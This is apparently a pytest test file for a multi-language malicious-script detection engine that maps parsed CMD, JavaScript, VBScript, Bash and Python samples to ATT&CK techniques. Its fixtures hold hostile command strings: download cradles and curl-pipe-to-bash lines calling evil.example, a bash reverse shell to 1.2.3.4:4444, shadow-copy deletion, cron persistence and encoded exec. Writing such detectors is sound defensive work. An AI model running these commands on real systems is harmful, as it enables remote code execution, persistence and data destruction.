"""
DIE Cycle B · Multi-language ASTs
─────────────────────────────────
Deterministic guarantees + technique mapping for every non-PowerShell
parser shipped in Cycle B.
"""
import pytest
from services.die.api import analyze, detect_language
from services.die.cmd_ast import parse_cmd
from services.die.javascript_ast import parse_javascript
from services.die.vbscript_ast import parse_vbscript
from services.die.bash_ast import parse_bash
from services.die.python_ast import parse_python


# ── deterministic parity ──────────────────────────────────────────
@pytest.mark.parametrize("parser,src", [
    (parse_cmd,        "cmd.exe /c set X=1 & call %X%"),
    (parse_javascript, "var s = new ActiveXObject('WScript.Shell'); s.Run('cmd')"),
    (parse_vbscript,   'Dim x\nSet x = CreateObject("WScript.Shell")\nx.Run "cmd"\nEnd'),
    (parse_bash,       "curl -sL http://x/y | bash"),
    (parse_python,     "import base64,subprocess\nsubprocess.Popen(base64.b64decode('YQ=='))"),
])
def test_parser_deterministic(parser, src):
    assert parser(src) == parser(src)


# ── CMD / Batch ───────────────────────────────────────────────────
def test_cmd_download_cradle_certutil():
    ast = parse_cmd("certutil.exe -urlcache -f http://evil.example/x.exe out.exe")
    assert ast["flags"]["download_cradle"]
    assert any(lb["binary"] == "certutil.exe" for lb in ast["lolbins"])
    ids = {t["id"] for t in ast["techniques"]}
    assert "T1105" in ids

def test_cmd_shadow_delete_ransomware_precursor():
    ast = parse_cmd("vssadmin delete shadows /all /quiet & wbadmin delete catalog -quiet")
    assert ast["flags"]["shadow_delete"]
    ids = {t["id"] for t in ast["techniques"]}
    assert "T1490" in ids

def test_cmd_wmic_exec():
    ast = parse_cmd('wmic process call create "powershell.exe -c IEX(...)"')
    assert ast["flags"]["wmic_exec"]
    ids = {t["id"] for t in ast["techniques"]}
    assert "T1047" in ids


# ── JavaScript ────────────────────────────────────────────────────
def test_js_activex_shell_run():
    ast = parse_javascript(
        "var s = new ActiveXObject('WScript.Shell'); s.Run('cmd /c calc')")
    assert ast["flags"]["activex_abuse"]
    assert ast["flags"]["shell_exec"]
    ids = {t["id"] for t in ast["techniques"]}
    assert "T1059.007" in ids

def test_js_download_via_xhr():
    src = ("var x = new XMLHttpRequest(); x.open('GET','http://x/y',false); "
           "x.send(); eval(x.responseText);")
    ast = parse_javascript(src)
    assert ast["flags"]["download_cradle"]
    assert ast["flags"]["eval_or_function"]
    ids = {t["id"] for t in ast["techniques"]}
    assert "T1105" in ids
    assert "T1027" in ids

def test_js_hex_obfuscation():
    src = "var s = '\\x63\\x6d\\x64\\x2e\\x65\\x78\\x65';"
    ast = parse_javascript(src * 10)  # inflate hex signals
    assert ast["complexity"]["obfuscation_score"] >= 20


# ── VBScript ──────────────────────────────────────────────────────
def test_vbs_shell_run_and_error_masking():
    src = (
        'On Error Resume Next\n'
        'Dim sh\n'
        'Set sh = CreateObject("WScript.Shell")\n'
        'sh.Run "cmd /c calc", 0, False\n'
        'End Sub'
    )
    ast = parse_vbscript(src)
    assert ast["flags"]["shell_execute"]
    assert ast["flags"]["error_masking"]
    ids = {t["id"] for t in ast["techniques"]}
    assert "T1059.005" in ids
    assert "T1027" in ids

def test_vbs_msxml_download():
    src = ('Set http = CreateObject("MSXML2.XMLHTTP")\n'
           'http.Open "GET","http://evil.example/x.exe",False\n'
           'http.Send\n'
           'End Sub')
    ast = parse_vbscript(src)
    assert ast["flags"]["download_cradle"]
    ids = {t["id"] for t in ast["techniques"]}
    assert "T1105" in ids


# ── Bash ──────────────────────────────────────────────────────────
def test_bash_curl_pipe_to_shell():
    ast = parse_bash("curl -sL http://evil.example/a | bash")
    assert ast["flags"]["pipe_to_shell"]
    assert ast["flags"]["download_cradle"]
    ids = {t["id"] for t in ast["techniques"]}
    assert "T1105" in ids

def test_bash_reverse_shell():
    ast = parse_bash("bash -i >& /dev/tcp/1.2.3.4/4444 0>&1")
    assert ast["flags"]["reverse_shell"]
    ids = {t["id"] for t in ast["techniques"]}
    assert "T1059.004" in ids

def test_bash_persistence_cron():
    ast = parse_bash("echo '* * * * * bash /tmp/x' | crontab -")
    assert ast["flags"]["persistence"]
    ids = {t["id"] for t in ast["techniques"]}
    assert "T1053.003" in ids


# ── Python ────────────────────────────────────────────────────────
def test_python_exec_base64():
    src = ("import base64\n"
           "exec(base64.b64decode('cHJpbnQoJ2hlbGxvJyk=').decode())")
    ast = parse_python(src)
    assert ast["flags"]["dynamic_exec"]
    assert ast["flags"]["encoded_payload"]
    ids = {t["id"] for t in ast["techniques"]}
    assert "T1027" in ids

def test_python_subprocess_and_download():
    src = ("import subprocess, urllib.request\n"
           "data = urllib.request.urlopen('http://evil/x').read()\n"
           "subprocess.Popen(data, shell=True)")
    ast = parse_python(src)
    assert ast["flags"]["subprocess_use"]
    assert ast["flags"]["http_download"]
    ids = {t["id"] for t in ast["techniques"]}
    assert "T1105" in ids
    assert "T1059.006" in ids


# ── Language detector across all Cycle-B parsers ──────────────────
def test_detect_python_by_import():
    assert detect_language("import os\nprint(os.name)") == "python"

def test_detect_cmd_by_set():
    assert detect_language("set X=hello && call %X%") == "cmd"

def test_analyze_dispatches_correct_parser():
    env = analyze("import requests\nrequests.get('http://x/y')")
    assert env["language"] == "python"
    assert env["ast"] is not None
    assert "iocs" in env
